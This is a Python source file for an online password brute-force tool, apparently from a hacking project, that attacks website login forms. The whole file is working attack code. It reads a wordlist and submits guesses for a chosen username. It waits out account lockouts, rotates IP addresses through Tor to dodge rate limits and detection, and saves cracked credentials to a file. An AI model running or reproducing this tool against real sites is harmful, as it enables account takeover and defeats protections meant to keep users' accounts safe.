# Date: 11/19/2017
# Author: Ethical-H4CK3R
# Description: Bruteforce Attack

import socks
import socket

from constants import *
from queue import Queue
from spyder import Spyder
from os.path import exists
from threading import Thread
from tor import tor_restart, tor_is_active
from time import time, sleep, strftime, gmtime

class Bruteforce(Spyder):

 def __init__(self, website, username, wordlist):

  # counters
  self.attempts = 0 # attempts made
  self.proxy_usage = 0 # incremented each time a proxy used
  self.proxy_fails = 0 # amount of times a proxy failed

  # string constants
  self.wordlist = wordlist # password file
  self.username = username # the target account
  self.site = sites[website] # Contains details of the targeted site

  # temporary storage
  self.proxies = Queue(proxies_max_size_) # a dynamic proxy list of recent proxies
  self.passlist = Queue(passlist_max_size) # passwords; prevents duplicates within the same queue

  # indicators
  self.ip = None
  self.pwd = None # for public access
  self.msg = None # the msg that is display when attack is over
  self.locked = False
  self.session = None # the session object
  self.reading = False # reaading the wordlist
  self.is_alive = False
  self.is_found = False
  self.retrieve = False # retrieve session's attempts from database

  super(Bruteforce, self).__init__()

 def login(self, pwd):
  try:

   # wait & hope for the account to be unlocked
   if self.locked:
    if time() >= self.locked:
     self.locked = False
     self.restart_tor()
    else:return

   url = self.site['url']
   username_field = self.site['username_field']
   password_field = self.site['password_field']

   br = self.br
   self.pwd = pwd
   self.proxy_usage += 1
   br.open(url, timeout=float(visit_login_page_timeout))

   # attempt login
   br.select_form(nr=0)
   br.form[username_field] = self.username
   br.form[password_field] = pwd
   html = br.submit().read()
   for _ in self.site['lock']:
    if _ in html:
     self.locked = time() + self.site['wait']
     self.session_write()
     return

   # validate
   for _ in self.site['key']:
    if _ in html:
     self.is_found = True
     self.msg = '\nPassword: {}{}{}'.format(colors['green'], pwd, colors['white'])
     creds = 'Site: {}\nUsername: {}\nPassword: {}\n\n'.\
     format(self.site['name'], self.username, pwd)
     with open(credentials, 'a') as f:f.write(creds)

   sleep(self.site['delay'])
   if not self.is_found:self.attempts += 1
   self.passlist.queue.pop(self.passlist.queue.index(pwd)) # remove the password from queue
   if all([not self.is_found, self.is_alive, not self.attempts%session_save_time]):self.session_write()

  except KeyboardInterrupt:self.kill()
  except:self.proxy_fails += 1
  finally:br.close()

 def session_write(self):
  queue = self.passlist.queue
  queue = str(queue) if queue else None
  locked_time = self.locked if self.locked else 0
  self.session.update(queue, locked_time, self.attempts)

 def attack(self):
  while all([not self.is_found, self.is_alive]):
   try:

    # set proxy if not set already
    if all([not self.ip, self.passlist.qsize()]):
     if not tor_is_active():self.restart_tor()
     else:self.renew_ip()

    # check if proxy is set
    if not self.ip:
     [sleep(1) for _ in range(proxies_wait_time) if self.is_alive]
     continue

    # update proxy after a couple of uses or proxy if fails
    if any([self.proxy_fails >= failures_max_size, self.proxy_usage >= proxy_total_usage]):
     self.restart_tor()

    # try all the passwords in the queue
    for pwd in self.passlist.queue:
     if self.proxy_fails >= failures_max_size:break
     if self.proxy_usage >= proxy_total_usage:break
     if any([not self.is_alive, self.is_found]):break
     self.login(pwd)
   except:pass

 def password_regulator(self):
  # reads the wordlist and append the passwords into the queue
  with open(self.wordlist, 'r') as wordlist:
   attempts = 0
   for pwd in wordlist:
    if any([not self.is_alive, self.is_found]):break

    if self.retrieve:
     if attempts < self.attempts:
      attempts += 1
      continue
     else:self.retrieve = False

    if self.passlist.qsize() < passlist_max_size:
     self.passlist.put(pwd.replace('\n', ''))
    else:
     while all([self.passlist.qsize(), not self.is_found, self.is_alive]):pass
     if all([not self.passlist.qsize(), not self.is_found, self.is_alive]):self.passlist.put(pwd)

  # done reading wordlist
  if self.is_alive:self.reading = False
  while all([not self.is_found, self.is_alive, self.passlist.qsize()]):
   try:sleep(1)
   except KeyboardInterrupt:break
  else:
   self.msg = '\nPassword: {}Not Found{}'.format(colors['red'], colors['white'])\
   if all([not self.msg, not self.reading]) else self.msg
   self.kill()

 def kill(self):
  self.is_alive = False
  if self.attempts>=5:self.session_write()
  if any([all([not self.passlist.qsize(), not self.reading]), self.is_found]):
   self.session.remove()

 def unlock_time(self):
  time_left = strftime('%H:%M:%S', gmtime(self.locked - time()))
  return '\n[-] Delay: {}{}{}'.format(colors['red'], time_left, colors['white'])

 def reset_proxy_counters(self):
  self.proxy_fails = 0
  self.proxy_usage = 0

 def restart_tor(self):
  tor_restart()
  self.reset_proxy_counters()
  self.renew_ip()

 def renew_ip(self):
  socks.socket.setdefaulttimeout(proxy_time_out)
  socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, tor_ip, tor_port, True)
  socket.socket = socks.socksocket
  self.ip = self.ip_addr

  if self.ip:
   if self.ip in self.proxies.queue:self.restart_tor()
   else:self.proxies.put(self.ip)

 def run(self):
  self.attempts = 0 if self.msg else self.attempts
  self.msg = None
  self.reading = True
  self.is_alive = True
  self.is_found = False
  Thread(target=self.password_regulator).start()
  self.attack()
  sleep(1.5)
